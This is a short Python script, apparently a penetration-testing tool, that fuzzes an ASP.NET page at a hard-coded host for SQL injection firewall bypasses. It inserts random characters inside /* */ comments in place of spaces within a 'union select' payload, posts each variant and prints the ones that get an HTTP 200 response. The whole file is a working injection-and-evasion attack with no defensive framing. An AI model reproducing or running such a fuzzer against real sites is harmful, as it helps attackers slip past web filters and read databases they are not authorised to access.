#! /usr/bin/env python
# -*- coding:utf-8 -*-
# 多注释符替代空格绕过_Fuzzing

import random
import requests
import time

headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0'}
url="http://hackrock.com:8205/index.aspx"
def generate_random_str1(randomlength=4):
	random_str = ''
	base_str = '!@$%^&*()_+=-'
	length = len(base_str) - 1
	for i in range(randomlength):
		random_str += base_str[random.randint(0, length)]
	return random_str

def generate_random_str2(randomlength=10):
	random_str = ''
	base_str = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
	length = len(base_str) - 1
	for i in range(randomlength):
		random_str += base_str[random.randint(0, length)]
	return random_str


for i in range(600):
	random_str = generate_random_str1() + generate_random_str2()
	payload = {'id':"1 union/*"+random_str+"*/select 1,'2','3'"}
	try:
		time.sleep(0.5)
		response = requests.post(url=url, headers=headers, data=payload, timeout=0.5)
		if response.status_code == 200:
			print(payload)
	except:
		pass
